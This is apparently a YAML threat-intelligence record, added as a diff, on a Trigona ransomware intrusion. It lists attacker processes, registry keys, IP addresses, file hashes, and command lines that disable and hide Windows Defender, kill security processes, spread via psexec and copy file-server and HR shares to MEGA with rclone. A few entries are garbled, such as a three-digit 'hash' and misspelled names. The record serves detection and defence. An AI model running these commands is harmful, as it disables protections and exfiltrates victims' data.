@@ -1,0 +1,176 @@
+summary: Triagona ransomware spreads through SMB connections, encrypting files and
+  exfiltrating data via Mega.io.
+date: '2024-03-09'
+authors:
+- pcsc0ut
+- unnamed contributor 3 (UC3)
+- MetallicHack
+attribution: USA Spain
+malware_families:
+- Trigona Ransomware
+- rclone.exe
+- build_redacted.exe
+- netscan.exe
+- Triagona Ransomware
+- Trigona
+TTPs:
+  processs:
+  - MSASCuiL.exe
+  - psexec.exe
+  - konus
+  - ipinfo.bat
+  - notepad.exe
+  - ipwho.bat
+  - explorer.exe
+  - psNET.bat
+  - netscan.exe
+  - build_.exe
+  - openrdp.bat
+  - ipall.bat
+  - whoami.exe
+  - cmd.exe
+  - DefenderON.bat
+  - net.exe
+  - rdp.exe
+  - cnd.exe
+  - msedge.exe
+  - start.bat
+  - newnewuser.bat
+  - PSKILL64
+  - newuser.bat
+  - rclone.exe
+  - build_redacted.exe
+  - Snap2HTML
+  - powershell.exe
+  - SU64
+  - DefenderOFF.bat
+  - konua
+  commandline:
+  - cmd.exe /cfor %%A IN (SecurityHealthService.exe SecurityHealthSystray.exe smartscreen.exe)
+    DO %~dpB\\pskill64 %%A -accepteula -t45
+  - powershell Set-MpPreference -DisableRealtimeMonitoring $true
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
+    /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
+  - rclone.exe copy "\\\\IP ADDRESSI\\\\Files" MEGA:domain -q
+  - cmd.exe /cfor %%A IN (WdFilter WdBoot Sense WdNisDrv WdNisSvc WinDefend SecurityHealthService)
+    DO sc config %%A start=auto
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration"
+    /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f
+  - C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe --single-argunent
+    \\\\18 \\ \\Security_Policy_2621.pdf
+  - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe --> C:\\Windows\\system32\\net.exe
+    group /domain
+  - Reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
+    /v "SettingsPageVisibility" /t REG SZ /d "hide:windowsdefender" /f
+  - Reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth"
+    /f
+  - REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
+    /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "SubmitSamplesConsent"
+    /t REG_DWORD /d 0x2 /f
+  - ipinfo.bat
+  - '"C:\\Windows\\system32\\net.exe" group "domain admins" /domain'
+  - powershell Set-MpPreference -SubmitSamplesConsent 2
+  - REG DELETE "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth"
+    /f
+  - cmd.exe /cfor %%A IN (WinDefend WdFilter| WdBoot Sense WdNisDrv WdNisSvc SecurityHealthService)
+    DO net stop %%A
+  - ipwho.bat
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "ServiceKeepAlive"
+    /t REG_DWORD /d 0x0 /f
+  - psNET.bat
+  - '"cd %~dp0 --> rclone.exe copy "\\\\FILE SERVER\\Files" MEGA:domain -q --ignore-existing
+    --auto-confirm --multi-thread-streams 12 --transfers 12"'
+  - netscan.exe
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
+    /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
+  - openrdp.bat
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "LocalSettingOverrideSpynetReporting"
+    /t REG_DWORD /d 0x0 /f
+  - ipall.bat
+  - konus.bat
+  - C:\\Windows\\system32\\net.exe group "domain admins" /domain
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "AllowFastServiceStartup"
+    /t REG_DWORD /d 0x0 /f
+  - cmd /c "C:\\Users\\Administrator\\Music\\start  .bat"
+  - taskkill /F /IM MSASCuiL.exe
+  - psexec.exe -accepteula -nobanner -s \\\\%0 c:\\temp\\x.bat o
+  - DefenderON.bat
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "DisableBlockAtFirstSeen"
+    /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer" /v "DisableNotificationCenter"
+    /t REG_DWORD /d 0x1 /f
+  - start.bat
+  - start  konua.bat --ignore-existing --auto-confirm --multi-thread-streams12 --transfers
+    **
+  - '"cd %~dp0 --> rclone.exe copy "\\\\FILE SERVER\\human resources" MEGA:domain
+    -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12"'
+  - cmd.exe /cfor %%A IN (WdFilter WdBoot Sense WdNisDrv WdNisSvc WinDefend SecurityHealthService)
+    DO sc config %%A start=disabled
+  - newnewuser.bat
+  - cmd.exe /cfor %%A IN (WinDefend WdNisSvc) DO net start %%A
+  - powershell Set-MpPreference -MAPSReporting 0
+  - cmd /c "C:\\Users\\Administrator\\Music\\start    .bat"
+  - Reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware"
+    /t REG DWORD /d "1" /f
+  - REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware"
+    /t REG_DWORD /d 0x1 /f
+  - newuser.bat
+  - rclone.exe
+  - build_redacted.exe
+  - rdp.exe /v:%@ /u:{user} /p:{pass}
+  - C:\\Users\\Administrator\\Music\\build_ .exee \\build .exe
+  - C:\\Windows\\Explorer
+  - Reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v "DisableAntiVirus" /t
+    REG DWORD /d "1" /f
+  - C:\\Windows\\system32\\whoami.exe
+  - DefenderOFF.bat
+  - konua
+  powershell:
+  - Set-MpPreference -DisableRealtimeMonitoring $true
+  - Set-MpPreference -SubmitSamplesConsent 2
+  - Set-MpPreference -MAPSReporting 0
+  registry_keys:
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+  - HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet
+  - HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection
+  - HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer
+  - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer
+  - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender
+  - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer
+  network_connections: []
+  file_modifications: []
+  persistence:
+  - Description: Local accounts created to add new user and grant admin privileges.
+  pipes: []
+  process_relations: []
+  scripting_engine: []
+IOCs:
+- IP: 77.83.36.6
+- IP: 193.106.31.98
+- File hash: 1852be15aa8dcf664291b3849bd348e4
+- File hash: eea811d2a304101cc0b0edebe6590ea0f3da0a27
+- File hash: d743daa22fdf4313a10da027b034c603eda255be037cb45b28faea23114d3b8a
+- File hash: c5d7ce243c1d735d9ca419cc916b87ec
+- File hash: 21b7460aa5f7eb7a064d2a7a6837da57719f9c2e
+- File hash: d6d8302d8db7f17aaa45059b60eb8de33166c95d1d833ca4d5061201e4737009
+- File hash: b2bb4d49c38f06a42f15b39744d425d0
+- File hash: 2f5991e67615763865b7e4c4c9558eb447ed7c0d
+- File hash: 12f838b54c6dac78f348828fe34f04ac355fa8cc24f8d7c7171d310767463c6c
+- File hash: 09dcedb5a6ad0ef5bbea4496486ba4e5
+- File hash: 723baea0983b283eebd8331025a52eb13d5daaa7
+- File hash: 277550c9d5771a13b65e90f5655150e365516215a714ffd3f075b5b426e2ddc1
+- File hash: 0fd71d43c1f07d6a8fa73b0fa7beffa7
+- File hash: 52f7e3437d83e964cb2fcc1175fad0611a12e26c
+- File hash: 35ff76d763714812486a2f6ad656d124f3fcdfc4d16d49df6221325c8ae8827a
+- File hash: 44370f5c977e415981febf7dbb87a85c
+- File hash: ac0dce3b0f5b8d187a2e3f29efc358538fd4aa45
+- File hash: 56b08aa03bd8c0ea094cfeb03d5954ffd857bac42df929dc835eea62f32b09e0
+- File hash: 3bce26176509adf3f9d8e2e274d92f9e
+- File hash: 800
+author: ''
+reference: https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
+file_creation_date: May 09, 2025
